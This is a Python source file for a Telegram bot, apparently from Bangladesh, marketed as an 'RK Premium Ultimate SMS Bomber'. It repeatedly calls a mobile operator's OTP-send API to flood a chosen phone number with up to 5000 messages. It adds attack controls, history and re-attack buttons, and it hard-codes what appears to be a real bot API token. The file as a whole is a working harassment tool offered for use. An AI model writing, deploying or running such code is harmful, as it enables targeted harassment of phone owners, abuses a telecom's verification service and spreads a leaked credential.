# ======================================================================================
# 🚀 PROJECT: RK PREMIUM ULTIMATE SMS BOMBER - V15.2 (STABLE)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 💻 DEVELOPER   : @itzrkraihan
# 📡 PLATFORM    : RENDER OPTIMIZED (AUTO-WAKEUP & HEALTH-CHECK)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

import asyncio
import aiohttp
import telebot
import time
import datetime
import pytz
import psutil
import json
import os
import logging
import sys
import traceback
from telebot.async_telebot import AsyncTeleBot
from telebot import types
from aiohttp import web 

# --- [ LOGGING CONFIGURATION ] ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("RK_V15_SYSTEM")

# --- [ CONFIGURATION ] ---
API_TOKEN = '8479817459:AAEgiLY2rnRuzsgCbD91nTzCdDMTaM_vOAs'
ADMIN_ID = 6048050987  
TARGET_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
WAKEUP_URL = "https://rkbombx.onrender.com" 
DB_FILE = "rk_users_v15.json"
HISTORY_FILE = "rk_history_v15.json"
SYSTEM_STATS_FILE = "rk_system_stats.json"

bot = AsyncTeleBot(API_TOKEN)

# Global State
active_attacks = {}  
user_states = {}
authorized_users = {ADMIN_ID}
attack_history = []
global_sms_count = 0

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ SECTION 1: RENDER DEPLOYMENT UTILITIES ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def keep_alive():
    """নিজেকে পিং করে রেন্ডার সার্ভারকে স্লিপ মোডে যাওয়া থেকে রক্ষা করে।"""
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(WAKEUP_URL) as resp:
                    logger.info(f"📡 Wakeup Pulse Sent: {resp.status}")
            except Exception as e:
                logger.error(f"⚠️ Wakeup Pulse Failed: {e}")
            await asyncio.sleep(300) # ৫ মিনিট পর পর

async def handle_health_check(request):
    """রেন্ডারের হেলথ চেক রিকোয়েস্ট হ্যান্ডেল করে।"""
    return web.Response(text="🚀 RK V15 SYSTEM IS LIVE!", content_type='text/html')

async def start_health_server():
    """একটি ইন্টারনাল ওয়েব সার্ভার চালু করে যা রেন্ডারের পোর্ট বাইন্ডিং বজায় রাখে।"""
    app = web.Application()
    app.router.add_get('/', handle_health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    # পোর্টেবল রেন্ডার পোর্ট অথবা ডিফল্ট ১০,০০০
    port = int(os.environ.get("PORT", 10000)) 
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logger.info(f"✅ Health Server Active on Port {port}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ SECTION 2: DATA PERSISTENCE ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def load_data():
    global authorized_users, attack_history, global_sms_count
    try:
        if os.path.exists(DB_FILE):
            with open(DB_FILE, "r") as f: authorized_users = set(json.load(f))
        if os.path.exists(HISTORY_FILE):
            with open(HISTORY_FILE, "r") as f: attack_history = json.load(f)
        if os.path.exists(SYSTEM_STATS_FILE):
            with open(SYSTEM_STATS_FILE, "r") as f:
                stats = json.load(f)
                global_sms_count = stats.get("total_sent", 0)
        logger.info("💾 Databases loaded successfully.")
    except Exception as e:
        logger.error(f"❌ Load Error: {e}")

def save_data():
    try:
        with open(DB_FILE, "w") as f: json.dump(list(authorized_users), f, indent=4)
        with open(HISTORY_FILE, "w") as f: json.dump(attack_history[-50:], f, indent=4)
        with open(SYSTEM_STATS_FILE, "w") as f: json.dump({"total_sent": global_sms_count}, f, indent=4)
    except Exception as e:
        logger.error(f"❌ Save Error: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ SECTION 3: KEYBOARD & ENGINE ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🚀 Start Attack", "📜 Attack History", "⏳ Running List", "💎 My Status", "📊 System Info", "📞 Support")
    return markup

def get_control_panel(chat_id, status, target=None):
    markup = types.InlineKeyboardMarkup(row_width=2)
    p_text = "⏸ Pause" if status == "running" else "▶️ Resume"
    p_callback = f"pau_{chat_id}" if status == "running" else f"res_{chat_id}"
    markup.add(
        types.InlineKeyboardButton(p_text, callback_data=p_callback),
        types.InlineKeyboardButton("⏹ Stop", callback_data=f"stp_{chat_id}")
    )
    if status == "completed" and target:
        markup.add(types.InlineKeyboardButton("🔄 Re-Attack", callback_data=f"re_{target}"))
    return markup

async def perform_sms(session, number, stats):
    global global_sms_count
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    try:
        async with session.post(TARGET_URL, json={"msisdn": number}, headers=headers, timeout=8) as resp:
            if resp.status == 200:
                stats['ok'] += 1
                global_sms_count += 1
            else: stats['err'] += 1
    except: stats['err'] += 1
    stats['total'] += 1

async def attack_orchestrator(chat_id, message_id, target, limit):
    evt = asyncio.Event()
    evt.set()
    active_attacks[chat_id] = {'event': evt, 'status': 'running', 'stop': False, 'target': target}
    
    stats = {'ok': 0, 'err': 0, 'total': 0}
    
    

    async with aiohttp.ClientSession() as session:
        while stats['total'] < limit:
            if active_attacks.get(chat_id, {}).get('stop'): break
            if not evt.is_set(): await evt.wait()
            
            # Batch Execution
            batch_size = min(15, limit - stats['total'])
            tasks = [perform_sms(session, target, stats) for _ in range(batch_size)]
            await asyncio.gather(*tasks)
            
            # Dashboard UI Update
            try:
                prog = int((stats['total']/limit)*100)
                bar = "🔹"*(prog//10) + "▫️"*(10-(prog//10))
                current_status = active_attacks[chat_id]['status'].upper()
                txt = (f"⚡ **RK ATTACK MONITOR** ⚡\n"
                       f"━━━━━━━━━━━━━━━━━━━━━━\n"
                       f"📱 **Target:** `{target}`\n"
                       f"📊 **Progress:** `{prog}%` | {bar}\n"
                       f"✅ **Success:** `{stats['ok']}` | ❌ **Fail:** `{stats['err']}`\n"
                       f"🔢 **Total:** `{stats['total']}/{limit}`\n"
                       f"📡 **Status:** `{current_status}`\n"
                       f"━━━━━━━━━━━━━━━━━━━━━━\n"
                       f"🚀 *Power by RK Premium*")
                
                await bot.edit_message_text(txt, chat_id, message_id, 
                                          reply_markup=get_control_panel(chat_id, active_attacks[chat_id]['status']),
                                          parse_mode='Markdown')
            except: pass
            await asyncio.sleep(1.8) # Throttling for stability

    # Final Summary
    active_attacks[chat_id]['status'] = 'completed'
    save_data()
    summary = (f"🏁 **ATTACK FINISHED** 🏁\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n"
               f"📱 Target: `{target}`\n"
               f"✅ Success: `{stats['ok']}`\n"
               f"❌ Fail: `{stats['err']}`\n"
               f"🕒 Finished at: `{datetime.datetime.now(pytz.timezone('Asia/Dhaka')).strftime('%I:%M %p')}`")
    
    await bot.send_message(chat_id, summary, reply_markup=get_control_panel(chat_id, "completed", target), parse_mode='Markdown')
    active_attacks.pop(chat_id, None)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ SECTION 4: HANDLERS & ROUTING ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=['start'])
async def start_cmd(m):
    welcome = (f"👋 **স্বাগতম, {m.from_user.first_name}!**\n"
               f"এটি **RK ULTIMATE V15.2** সিস্টেম।\n"
               f"আপনার কাঙ্ক্ষিত নম্বরটি বোম্বিং করতে প্রস্তুত।")
    await bot.send_message(m.chat.id, welcome, reply_markup=get_main_menu(), parse_mode='Markdown')

@bot.message_handler(func=lambda m: m.text == "🚀 Start Attack")
async def ask_num(m):
    if m.chat.id not in authorized_users: 
        return await bot.reply_to(m, "❌ **Access Denied!** এডমিনকে নক দিন।")
    user_states[m.chat.id] = "num"
    await bot.send_message(m.chat.id, "📞 **১১ ডিজিটের টার্গেট নম্বর দিন:**", reply_markup=types.ReplyKeyboardRemove())

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "num")
async def get_num(m):
    if len(m.text) == 11 and m.text.isdigit():
        user_states[m.chat.id] = {"target": m.text, "state": "limit"}
        await bot.send_message(m.chat.id, "🔢 **অ্যাটাক পরিমাণ দিন (সর্বোচ্চ ৫০০০):**")
    else: await bot.reply_to(m, "❌ **ভুল নম্বর!** সঠিক ১১ ডিজিট দিন।")

@bot.message_handler(func=lambda m: isinstance(user_states.get(m.chat.id), dict) and user_states[m.chat.id].get("state") == "limit")
async def get_lim(m):
    try:
        limit = min(int(m.text), 5000)
        target = user_states[m.chat.id]['target']
        user_states.pop(m.chat.id)
        msg = await bot.send_message(m.chat.id, "⚙️ **সার্ভার ইঞ্জিন লোড হচ্ছে...**")
        asyncio.create_task(attack_orchestrator(m.chat.id, msg.message_id, target, limit))
    except: await bot.reply_to(m, "❌ দয়া করে শুধু সংখ্যা দিন।")

@bot.message_handler(func=lambda m: m.text == "📊 System Info")
async def sys_info(m):
    info = (f"🖥 **SERVER STATUS**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚙️ CPU: `{psutil.cpu_percent()}%`\n"
            f"🧠 RAM: `{psutil.virtual_memory().percent}%`\n"
            f"🌐 Total Sent: `{global_sms_count}`\n"
            f"📡 Status: `Online 🟢`")
    await bot.reply_to(m, info, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda c: True)
async def callback_handler(c):
    cid = c.message.chat.id
    if cid in active_attacks:
        if c.data.startswith("pau_"):
            active_attacks[cid]['event'].clear()
            active_attacks[cid]['status'] = "paused"
            await bot.answer_callback_query(c.id, "অ্যাটাক থামানো হয়েছে ⏸")
        elif c.data.startswith("res_"):
            active_attacks[cid]['event'].set()
            active_attacks[cid]['status'] = "running"
            await bot.answer_callback_query(c.id, "আবার শুরু হচ্ছে ▶️")
        elif c.data.startswith("stp_"):
            active_attacks[cid]['stop'] = True
            active_attacks[cid]['event'].set()
            await bot.answer_callback_query(c.id, "অ্যাটাক চিরস্থায়ীভাবে বন্ধ করা হয়েছে ⏹")
    
    if c.data.startswith("re_"):
        target = c.data.split("_")[1]
        user_states[cid] = {"target": target, "state": "limit"}
        await bot.send_message(cid, f"🔄 **Re-Attacking:** `{target}`\n🔢 পরিমাণ দিন:")
        await bot.answer_callback_query(c.id)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ SECTION 5: INITIALIZATION & BOOT ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def main():
    logger.info("RK V15.2 IS BOOTING...")
    load_data()
    # Concurrent running: Bot + Web Server + Wakeup Ping
    await asyncio.gather(
        start_health_server(),
        keep_alive(),
        bot.polling(non_stop=True, timeout=90)
    )

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("System Shutdown.")
